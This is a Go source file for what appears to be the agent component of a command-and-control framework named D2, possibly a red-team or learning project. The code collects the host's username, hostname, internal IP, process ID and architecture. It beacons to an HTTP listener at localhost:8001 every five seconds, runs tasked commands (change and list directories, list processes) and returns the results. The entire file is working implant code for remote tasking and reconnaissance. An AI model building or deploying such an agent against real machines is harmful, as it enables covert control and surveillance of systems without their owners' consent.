package main

import (
	"fmt"
	"net"
	"os"
	"os/user"
	"runtime"
	"time"

	"github.com/gerbsec/D2/agent/commands"
	"github.com/gerbsec/D2/agent/models"

	"github.com/google/uuid"
)

var (
	metadata   *models.AgentMetadata
	commModule models.CommModule
	cmds       = []models.AgentCommand{}
)

func main() {
	LHOST := "localhost"
	LPORT := 8001
	generateMetadata()
	loadAgentCommands()
	commModule = models.NewHttpCommModule(LHOST, LPORT)
	commModule.Init(metadata)

	done := commModule.Start()
	defer commModule.Stop()

	for {
		select {
		case <-done:
			return
		case <-time.After(time.Second * 5):
			tasks, ok := commModule.RecvData()
			if ok {
				handleTasks(tasks)
			}
		}

	}
}

func handleTasks(tasks []*models.AgentTask) {
	for _, task := range tasks {
		handleTask(task)
	}
}

func handleTask(task *models.AgentTask) {
	var cmd models.AgentCommand
	for _, c := range cmds {
		if c.Name() == task.Command {
			cmd = c
			break
		}
	}

	if cmd == nil {
		return
	}

	result := cmd.Execute(task)
	sendTaskResult(task.Id, result)
}

func sendTaskResult(taskId string, result string) {
	taskResult := &models.AgentTaskResult{
		Id:     taskId,
		Result: result,
	}

	commModule.SendData(taskResult)
}

func InternalIP() (string, error) {
	interfaces, err := net.Interfaces()
	if err != nil {
		return "", err
	}

	for _, iface := range interfaces {
		addrs, err := iface.Addrs()
		if err != nil {
			return "", err
		}

		for _, addr := range addrs {
			if ipNet, ok := addr.(*net.IPNet); ok && !ipNet.IP.IsLoopback() && !ipNet.IP.IsLinkLocalUnicast() {
				if ipNet.IP.To4() != nil {
					return ipNet.IP.String(), nil
				}
			}
		}
	}

	return "", err
}

func generateMetadata() {
	currentUser, err := user.Current()
	if err != nil {
		fmt.Println("Error getting current user:", err)
		os.Exit(1)
	}

	hostname, err := os.Hostname()
	if err != nil {
		fmt.Println("Error getting hostname:", err)
		os.Exit(1)
	}

	ip, err := InternalIP()
	if err != nil {
		ip = "127.0.0.1"
	}

	architecture := "x86"
	if runtime.GOARCH == "amd64" {
		architecture = "x64"
	}

	metadata = &models.AgentMetadata{
		Id:           uuid.New().String(),
		Hostname:     hostname,
		Username:     currentUser.Username,
		Ip:           ip,
		ProcessName:  os.Args[0],
		ProcessId:    os.Getpid(),
		Architecture: architecture,
	}
}

func loadAgentCommands() {
	cmds = append(cmds, &commands.ChangeDirectory{})
	cmds = append(cmds, &commands.PrintWorkingDirectory{})
	cmds = append(cmds, &commands.ListDirectory{})
	cmds = append(cmds, &commands.ListProcesses{})
}
